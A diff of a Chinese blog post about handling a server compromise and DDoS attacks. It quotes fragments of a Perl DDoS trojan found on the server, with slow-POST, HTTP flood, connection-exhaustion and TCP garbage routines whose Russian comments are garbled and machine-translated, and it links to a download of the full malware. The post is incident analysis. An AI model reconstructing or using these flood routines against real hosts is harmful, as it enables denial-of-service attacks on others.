@@ -23,9 +23,10 @@ http://www.lovelucy.info/an-experience-of-server-anti-ddos.html<br>
 
 <font color="navy">
 Galaxy看到注释中有<code>#id3|slowpost|ya3.ru|3128|/index.html</code>，就猜到是俄语。到EditPlus中翻了半天，找到<code>Ukrainian (MAC) 10017</code>，解出来一看，果然是。<br>
-话说，俄语的学名是“乌克兰语”<font style="font-family: monospace;">[j'kreinən]</font>么？
+话说，俄语的学名是“乌克兰语” <font style="font-family: Arial Unicode MS, Lucida Sans Unicode;">[ukrɑˈjɪɲsʲkɑ ˈmɔwɑ] </font>么？
 </font>
 
+{% highlight perl %}
 	sub sendSlowPostRequest {
 		my $host = $_[0];
 		my $port = $_[1];
@@ -59,7 +60,82 @@ Galaxy看到注释中有<code>#id3|slowpost|ya3.ru|3128|/index.html</code>，就
 		close(SOCK);
 		print "end\n";
 	}
+{% endhighlight %}
 
 后来我们清理掉了所有木马，限制脚本运行，配置防火墙阻止向外发送异常数据。至于我们自己被 DDOS 攻击，也是配防火墙搞定，那几台设备好几百万，还是相当给力的。因为来自中国的攻击很多，Boss 一直对内地黑客十分“敬仰”，要我介绍几个给他认识。。其实我是了解国内那些所谓的“黑客”的，不得已只好把也是武大信安毕业后来去中科院的 LC 拉来……后来 Boss 还跑去北京找绿盟谈过合作，据说他家要上市了。
 
 代码请[猛戳这里](/assets/wp-uploads/2012/peach.20120228.zip "http://host-for-download.googlecode.com/files/peach.20120228.zip")下载。有任何研究发现，欢迎分享。
+
+* * *
+
+<font color="navy">Galaxy随手喂Google翻译了几句：</font>
+
+{% highlight perl %}
+	#хттп √≈“ атака (парамерты : хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами)
+	# Http √ ≈ "attack (paramerty: host, port, path to the script, the time ¤ ¤ timeout between requests)
+	sub sendGetRequest {
+		my $host = $_[0];
+		my $port = $_[1];
+		my $path = $_[2];	
+
+	#хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами, текстовый буффер дл¤ отсылки в теле ѕќ—“а
+	# Host, port, path to the script, the time ¤ ¤ timeout between requests, the text buffer dl ¤ ѕќ references in the body, "a
+	sub sendPostRequest {	
+		my $host = $_[0];
+		my $port = $_[1];
+		my $path = $_[2];	
+		my $content = $_[3];	
+
+	# HTTP GET (парамерты : хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами)
+	# HTTP GET (paramerty: host, port, path to the script, the time ¤ ¤ timeout between requests)
+	sub attackHttpGet {		
+		$child = fork;
+		if ($child == 0){								
+			my $host = $_[0];
+			my $port = $_[1];
+			my $path = $_[2];
+			my $sleep = $_[3];
+			my $duration = $_[4];
+
+	# ѕќ—“ атака (парамерты : хост, порт, путь до скрипта, врем¤ ожидани¤ между запросами, текстовый буффер дл¤ отсылки в теле ѕќ—“а)
+	# Ѕќ-"attack (paramerty: host, port, path to the script, the time ¤ ¤ timeout between requests, the text buffer dl ¤ ѕќ references in the body-" a)
+	sub attackHttpPost {	
+		$child = fork;
+		if ($child == 0){								
+			my $host = $_[0];
+			my $port = $_[1];
+			my $path = $_[2];
+			my $sleep = $_[3];
+			my $content = $_[4];
+			my $duration = $_[5];
+
+	# TROLL атака (парамерты : хост, порт, кол-во коннектов на 1 поток, слип). если порт 0, то порт рандом. 
+	# TROLL attack (paramerty: host, port, number of connections in a thread, slip). if the port is 0, the random port.
+	sub attackTroll {	
+		$child = fork;
+		if ($child == 0){
+			my $host = $_[0];
+			my $port = $_[1];
+			my $connects = $_[2];
+			my $sleep = $_[3];
+			my $duration = $_[4];
+
+	# TCP атака. тоже что и тролл, но с посылкой мусора в порт после коннекта. доп.параметр : максимальный размер мусорного реквеста.
+	# TCP attack. Same as trolley buses, but with sending debris into port after connect. dop.parametr: the maximum size of a garbage rekvesta.
+	sub attackTcpTroll {	
+		$child = fork;
+		if ($child == 0){			
+			my $host = $_[0];
+			my $port = $_[1];
+			my $connects = $_[2];
+			my $maxLen = $_[3];
+			my $duration = $_[4];				
+
+	# HTTP from IRC (парамерты : хост, длительность)
+	# HTTP from IRC (paramerty: host, duration)
+	sub attackHttpFlood {		
+		$child = fork;
+		if ($child == 0){	
+			my $host = $_[0];
+			my $duration = $_[1];	
+{% endhighlight %}
